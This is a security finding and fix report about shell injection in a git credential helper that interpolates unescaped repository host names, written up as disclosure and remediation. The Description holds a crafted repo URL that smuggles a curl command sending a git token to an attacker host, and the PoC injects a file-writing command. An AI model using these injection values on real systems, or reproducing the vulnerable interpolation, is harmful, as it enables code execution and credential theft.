---
id: SEC-T9-01
severity: critical
category: LLM01 - Prompt Injection (Indirect) / CWE-77 Command Injection
title: GIT_CONFIG_VALUE_0 shell credential helper built from unescaped host names — shell injection via adversarial repo URL
file: packages/adapters/claude-local/src/server/execute.ts:315-319
status: fixed
---

## Description

When a workspace has multiple git repositories, the adapter builds a git credential helper shell function by string-interpolating host names directly into a shell `case` expression injected via `GIT_CONFIG_VALUE_0`:

```typescript
env.GIT_CONFIG_VALUE_0 = `!f() { host=$(cat); case "$host" in ${cases} esac; }; f`;
```

where `cases` is built as:
```typescript
.map((host) => `*${host}*) echo "username=x-access-token"; echo "password=$GIT_TOKEN_${sanitizeEnvKey(host)}";;`)
```

`sanitizeEnvKey(host)` sanitizes for use as an *environment variable name*, but `host` itself is placed raw inside the shell `case` pattern. A workspace `repoUrl` with a crafted host like:
```
https://evil.com*) curl http://attacker.com -d "$GIT_TOKEN_EVIL_COM"; #/path/repo
```
…would inject arbitrary shell code into the credential helper executed whenever git requests credentials. This runs on the host machine (or inside Docker) with the full environment of the adapter process.

The `workspaceHints` array originates from `context.mnmWorkspaces`, which flows from issue context or heartbeat run context stored in the DB — writeable by users with issue-creation permissions.

## Impact

**Critical — Remote Code Execution on the host machine (or Docker container) running the claude-local adapter.** Any user who can create/edit an issue with a custom workspace repoUrl (or any agent that can write to `context.mnmWorkspaces`) can inject arbitrary shell commands executed during every git credential lookup of the Claude run. This does not require MCP access — it goes through the normal heartbeat/issue pipeline.

- **RCE on developer/agent machine** — executes as the user running MnM server
- **Token exfiltration** — all `GIT_TOKEN_*` env vars (including PATs) are available in the shell
- **ANTHROPIC_API_KEY exfiltration** — present in child env
- **Cross-agent pivot** — compromised host runs all agents

## Reproduction (PoC)

1. Create or edit an issue with `issueId` linked to an agent run.
2. Set workspace context (via heartbeat contextSnapshot or API) with:
   ```json
   { "mnmWorkspaces": [{ "repoUrl": "https://evil.com*) echo PWNED > /tmp/rce; #", "repoRef": "main" }] }
   ```
3. The adapter produces:
   ```
   GIT_CONFIG_VALUE_0 = "!f() { host=$(cat); case "$host" in *evil.com*) echo PWNED > /tmp/rce; #*) echo "username=..."; ... esac; }; f"
   ```
4. Whenever `claude` or any git subprocess resolves credentials, `/tmp/rce` is created (or any payload executes).

## Recommendation

Shell-quote the host inside the case pattern, or avoid shell credential helpers entirely:

**Preferred fix**: use `git credential-store` or a file-based `.netrc` approach — never construct shell functions from user-controlled data.

**Minimal fix**: shell-escape the host in the case pattern:
```typescript
const escaped = host.replace(/[^a-zA-Z0-9.\-]/g, "");
const cases = [...] .map((h) => `*${escaped}*) ...`);
```
But the preferred fix avoids shell entirely by writing a `~/.netrc` file per run in a temp directory and passing `GIT_CONFIG_VALUE_0 = "netrc -f /path/to/.netrc"`.

## Fix (2026-04-29)

Replaced the shell-function credential helper with a file-based `git credential-store` approach in `packages/adapters/claude-local/src/server/execute.ts`.

**Changes:**

1. **No more shell eval** — `GIT_CONFIG_VALUE_0` no longer uses `!f() { ... }; f` (a shell function). It now uses `store --file <path>`, which invokes `git credential-store` directly without any shell interpretation.

2. **Strict hostname validation** — Added `isValidGitHostname(host)` which enforces a strict RFC-1123 regex (`^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}...)*(:[0-9]{1,5})?$`) on every extracted hostname before it is used. Any hostname containing `*`, `)`, `;`, `$`, spaces, or any non-alphanumeric/dot/hyphen character is silently rejected — no credential injection occurs for that repo.

3. **Token URL-encoding** — Tokens are `encodeURIComponent()`-encoded before being written into the `.git-credentials` file, ensuring any special characters in the token value are safe for the credential-store format.

4. **Temp file at `mode 0o600`** — The `.git-credentials` file is written with owner-only permissions.

5. **Temp dir cleanup** — `credentialsTmpDir` is added to `ClaudeRuntimeConfig` and cleaned up in the `finally` block of `execute()`, alongside `skillsDir`.

6. **Whitespace guard** — If the resolved credential file path somehow contains whitespace (edge case where `os.tmpdir()` includes a space), the injection is skipped entirely rather than producing a broken or exploitable config value.

**Removed:** `GIT_TOKEN_<HOST>` environment variables (no longer needed since the shell function that consumed them is gone).

## References
- OWASP LLM Top 10 https://owasp.org/www-project-top-10-for-large-language-model-applications/
- CWE-78: OS Command Injection https://cwe.mitre.org/data/definitions/78.html
- CWE-77: Command Injection https://cwe.mitre.org/data/definitions/77.html
